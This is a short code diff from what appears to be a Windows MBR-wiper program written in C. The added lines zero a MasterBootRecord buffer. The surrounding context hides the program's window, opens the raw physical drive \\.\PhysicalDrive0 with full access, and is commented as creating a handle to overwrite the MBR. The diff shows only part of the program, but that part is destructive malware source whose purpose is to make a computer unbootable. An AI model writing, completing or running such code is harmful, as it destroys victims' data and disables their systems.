@@ -54,6 +54,8 @@ int main()
     ShowWindow(hWnd, SW_HIDE);
 
     DWORD dwBytesWritten;
+    
+    ZeroMemory(&MasterBootRecord, (sizeof MasterBootRecord));
     HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
   
     // Create handle for overwrite MBR
